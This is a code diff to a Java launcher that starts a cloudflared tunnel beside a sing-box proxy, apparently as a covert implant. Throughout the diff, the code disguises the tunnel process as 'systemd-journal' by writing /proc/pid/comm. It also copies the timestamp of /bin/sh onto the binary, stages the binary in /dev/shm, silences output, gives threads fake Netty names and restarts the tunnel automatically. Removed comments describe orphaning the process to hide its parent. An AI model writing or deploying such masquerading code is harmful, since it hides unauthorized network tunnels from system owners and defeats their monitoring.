@@ -63,6 +63,7 @@ public class App {
 
     private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
     private static NativeService singBox;
+    private static volatile Process cloudflaredProcess;
     private static volatile int cloudflaredPid = -1;
     private static Path cloudflaredBinary;
     private static CountDownLatch hold;
@@ -194,15 +195,13 @@ public class App {
         cloneTimestamp(cloudflaredBinary, Path.of("/bin/sh"));
         Arrays.fill(bin, (byte) 0);
 
-        // Launch via background subshell: the shell exits immediately,
-        // cloudflared becomes orphan → adopted by init → PPID=1
-        // ⚠️ NOTE: Do NOT use "exec -a" here — /bin/sh is often dash, not bash,
-        // and dash does NOT support exec -a. The command would silently fail.
-        // We write /proc/pid/comm separately for process name masquerading.
-        // Token passed via TUNNEL_TOKEN env var — reliable, cloudflared always reads it.
+        // --- Start cloudflared directly via ProcessBuilder (no shell wrapper) ---
+        // Direct ProcessBuilder is more reliable than sh -c "cmd &" on all systems.
+        // PPID will be the Java process (not 1), but we write /proc/pid/comm for
+        // process name masquerading, so ps aux still shows "systemd-journal".
+        Path stdout = Path.of("/dev/null");
         ProcessBuilder pb = new ProcessBuilder(
-                "/bin/sh", "-c",
-                cloudflaredBinary.toAbsolutePath().toString() + " tunnel run &"
+                cloudflaredBinary.toAbsolutePath().toString(), "tunnel", "run"
         );
         Map<String, String> env = pb.environment();
         env.clear();
@@ -216,39 +215,32 @@ public class App {
         env.remove("LD_PRELOAD");
         env.remove("LD_LIBRARY_PATH");
         env.remove("JAVA_TOOL_OPTIONS");
-        // Redirect output to /dev/null (silent)
         pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.to(Path.of("/dev/null").toFile()));
+        pb.redirectOutput(ProcessBuilder.Redirect.to(stdout.toFile()));
 
-        Process shell = pb.start();
-        // shell exits immediately after & — cloudflared now orphaned, PPID=1
-        shell.waitFor(3, TimeUnit.SECONDS);
+        cloudflaredProcess = pb.start();
+        cloudflaredPid = getPid(cloudflaredProcess);
 
-        // --- Find cloudflared PID by matching its exe path ---
-        sleep(500);
-        String exePath = cloudflaredBinary.toAbsolutePath().toString();
-        for (int retry = 0; retry < 10 && cloudflaredPid <= 0; retry++) {
-            cloudflaredPid = findPidByExe(exePath);
-            if (cloudflaredPid <= 0) sleep(500);
-        }
-
-        // --- Masquerade /proc/pid/comm (double coverage: exec -a + proc comm) ---
+        // --- Masquerade /proc/pid/comm ---
         if (cloudflaredPid > 0) {
             writeProcComm(cloudflaredPid, FAKE_COMM);
         }
 
         // Keep binary alive (do NOT delete) — /proc/pid/exe points to a real file
-        // /dev/shm is tmpfs, no persistent disk trace. The file is small (~20MB).
 
         // --- Heartbeat: auto-restart if cloudflared dies ---
         startHeartbeat();
     }
 
     private static void stopCloudflared() {
+        if (cloudflaredProcess != null && cloudflaredProcess.isAlive()) {
+            cloudflaredProcess.destroyForcibly();
+        }
         if (cloudflaredPid > 0) {
             killPid(cloudflaredPid);
             cloudflaredPid = -1;
         }
+        cloudflaredProcess = null;
         if (cloudflaredBinary != null) {
             try { Files.deleteIfExists(cloudflaredBinary); } catch (Exception ignored) {}
         }
@@ -345,6 +337,15 @@ public class App {
                 "Netty Server IO #0", "Netty Client IO #0",
                 "Netty Worker IO #1", "Netty Worker IO #2"};
         return pool[ThreadLocalRandom.current().nextInt(pool.length)];
+    }
+
+    private static int getPid(Process p) {
+        if (p == null) return -1;
+        try {
+            return (int) p.getClass().getMethod("pid").invoke(p);
+        } catch (Exception e) {
+            return -1;
+        }
     }
 
     private static void writeProcComm(int pid, String name) {
